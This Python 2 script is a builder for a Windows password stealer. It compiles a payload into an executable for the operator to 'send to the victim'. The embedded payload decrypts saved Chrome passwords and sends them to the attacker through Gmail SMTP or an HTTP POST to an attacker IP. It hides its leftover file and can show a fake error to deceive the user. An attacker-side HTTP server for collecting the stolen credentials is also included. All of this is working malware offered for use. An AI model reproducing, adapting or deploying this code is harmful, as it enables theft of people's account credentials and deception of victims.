# -*- coding: utf-8 -*-
# Created by darkArp. For more info check the instructions text file. MarioNascimento@ITCrashSecurity.com
# Contains test code to be cleaned up

# To include custom icon, place the icon of choice in the same directory as this script and rename it "icon.ico"

import os
import sys
import time
import py2exe
from shutil import rmtree
from distutils.core import setup
attacker_ip = ""
loop = True
error = "0"
email = ""
pwd = ""
mailto = ""
serverlineStart = 134
serverlineStop = 237

while loop == True:
    os.system("cls")
    print "You are using V3.1.2\n\nChoose how you want the passwords delivered\n"
    print "(1) - via email (only Gmail supported, example@gmail.com. Make sure you turn on 'allow less secure apps')\n"
    print "(2) - via the client.exe (to your computer directly)\n"
    option = raw_input('\nChoose a number [1-2]: ')
    if option == "1":
        appname="server_email"
        email = raw_input("Input your Gmail address: ")
        pwd = raw_input("Input your Gmail password: ")
        mailto = raw_input(
            "Input the email you want to send the passwords to. Leave black to send it to yourself: ")
        if not mailto:
            mailto = email
        loop = False
    elif option == "2":
        appname="server_ip"
        attacker_ip = raw_input('IP for revrse connection: ')
        loop = False

    else:
        raw_input(
            "You must choose a value between 1 and 2. Enter any key to try again..")


while loop == False:
    error = raw_input(
        "Do you want the server to display a fake Error message? [Y/N]: ")
    if error.lower() == "y" or error.lower() == "yes":
        error = "1"
        os.system("cls")
        print "Well done!\nThe server will be created shortly. Don't close this window"
        time.sleep(2)
        loop = True

    elif error.lower() == "n" or error.lower() == "no":
        error = "0"
        os.system("cls")
        print "Well done!\nThe server will be created shortly. Don't close this window"
        time.sleep(2)
        loop = True
    else:
        raw_input("You must choose either Y or N. Enter any key to try again..")


def done():
    os.system('cls')
    if option != "1":
        print 'Client has been created under name client.exe'
    print 'Server has been created under the name '+appname+'.exe\n'
    print '\nRemember: You send the '+appname+'.exe ' + 'to the victim!'
    raw_input("Press Enter to continue...")
    exit()


def py2crypt(filename):
    sys.argv.append("py2exe")
    if filename == "client.py":
        setup(
            options={'py2exe': {'bundle_files': 1, "excludes": ['pyreadline', 'difflib', 'doctest', 'optparse', 'pickle'], "dll_excludes": [
                'msvcr71.dll', 'Crypt32.dll'], "compressed": True, "optimize": 2}},
            console=[{'script': filename,
                      "icon_resources": [(0, "icon.ico")]}],
            zipfile=None,
        )

        if os.path.exists('client.exe'):
            os.remove('client.exe')
        os.rename('dist/client.exe', 'client.exe')
    else:
        setup(
            options={'py2exe': {'bundle_files': 1, "excludes": ['pyreadline', 'difflib', 'doctest', 'optparse', 'pickle'], "dll_excludes": [
                'msvcr71.dll', 'Crypt32.dll'], "compressed": True, "optimize": 2}},
            windows=[{'script': filename,
                      "icon_resources": [(0, "icon.ico")],
                      "dest_base" : appname}],
            zipfile=None,
            #  'uac_info': "requireAdministrator"
        )
        if os.path.exists(appname+'.exe'):
            os.remove(appname+'.exe')
        os.rename('dist/'+appname+'.exe', appname+'.exe')
        rmtree('build/')
        rmtree('dist/')


with open('create_server.py') as f1:
    with open('server.py', 'w') as f2:
        lines = f1.readlines()
        i = serverlineStart
        f2.write("# -*- coding: utf-8 -*-\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n'+'option = ' + '\''+option+'\'' + '\n'+'email = ' +
                 '\''+email + '\'' + '\n'+'pwd = ' + '\''+pwd + '\'' + '\n'+'mailto = ' + '\''+mailto + '\'' + '\n'+'error = ' + '\''+error + '\''+'\n')
        while(i < serverlineStop-1):
            f2.write(lines[i])
            i = i+1
    if option != "1":
        with open('client.py', 'w') as f3:
            i += 1
            while i < len(lines)-1:
                f3.write(lines[i])
                i = i+1
        py2crypt("client.py")
        print("[+] Client done building... \n[+] Building server...\n")
    time.sleep(3)
    py2crypt("server.py")
    try:
        os.remove('server.py')
        os.remove("client.py")
    except:
        pass
    done()

"""
import ctypes, smtplib, os, win32crypt, time, urllib
from shutil import copyfile
from subprocess import check_call
from sqlite3 import connect
from requests import get, post
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


destination = "error.txt"
def getpass():

    path = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"

    path2 = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login2"

    ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32, 126)]) + '_'*130
    path = path.strip()
    path = urllib.unquote(path)
    if path.translate(ASCII_TRANS) != path:  # Contains non-ascii
        path = path.decode('latin-1')
    path = urllib.url2pathname(path)

    ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32, 126)]) + '_'*130
    path2 = path2.strip()
    path2 = urllib.unquote(path2)
    if path2.translate(ASCII_TRANS) != path2:  # Contains non-ascii
        path2 = path2.decode('latin-1')
    path2 = urllib.url2pathname(path2)
    try:
        copyfile(path, path2)
    except:
        pass

    conn = connect(path2)

    cursor = conn.cursor()

    cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')

    if os.path.exists(destination):
        os.remove(destination)

    sites = []
    for raw in cursor.fetchall():
        try:
            if raw[0] not in sites:
                if os.path.exists(destination):
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
                else:
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
                sites.append(raw[0])
        except:
            continue

    conn.close()
    return 0





def sendpass():
    if option == "1":
        server = "smtp.gmail.com"
        msg = MIMEMultipart()
        filename = destination
        f = open(filename)
        attachment = MIMEText(f.read())
        f.close()
        attachment.add_header('Content-Disposition',
                              'attachment', filename=destination)
        msg.attach(attachment)

        mailer = smtplib.SMTP(server, 587)
        mailer.starttls()
        mailer.login(email, pwd)
        mailer.sendmail(email, mailto, msg.as_string())
        mailer.close()

    else:
        path = destination
        url = 'http://' + attacker_ip
        files = {'file': open(path, 'rb')}
        r = post(url, files=files)
        return 0
getpass()
sendpass()
try:
    os.remove(destination)
except:
    check_call(["attrib","+H",destination])
if error == "1":
    MB_OK = 0x00
    MB_ICONSTOP = 0x10
    ctypes.windll.user32.MessageBoxW(
        None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
        
import sys
import os
import BaseHTTPServer
import urlparse
host = '0.0.0.0'
port = 80


class poHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        return

    def do_POST(self):
        destination = "passwords.txt"
        add = 1
        self.send_response(200)
        if self.rfile:
            print "\n\nEstablished connection from " + \
                self.client_address[0] + \
                " (" + str(self.client_address[1]) + " -> " + str(port) + ")"
            if os.path.isfile(destination):
                exist = True
                while exist == True:
                    try:
                        if not os.path.isfile("passwords" + str(add) + ".txt"):
                            exist = False
                            destination = "passwords" + str(add) + ".txt"
                            break
                        add += 1
                    except Exception as err:
                        pass
            with open(destination, "wb") as pfile:
                for key, value in dict(urlparse.parse_qs(self.rfile.read(int(self.headers['Content-Length'])))).items():
                    for i in value:
                        pfile.write(i)
            print "Retrieved passwords from " + \
                self.client_address[0] + " into " + destination + "\n"

    def log_message(self, format, *args):
        return


def run(server=BaseHTTPServer.HTTPServer,
        handler=poHandler):
    server_address = (host, port)
    httpServ = server(server_address, handler)
    try:
        print("Waiting for connections...\n")
        httpServ.serve_forever()
    except KeyboardInterrupt:
        print ('[!] Server is terminated')
        httpServ.server_close()


if __name__ == '__main__':
    run()
"""
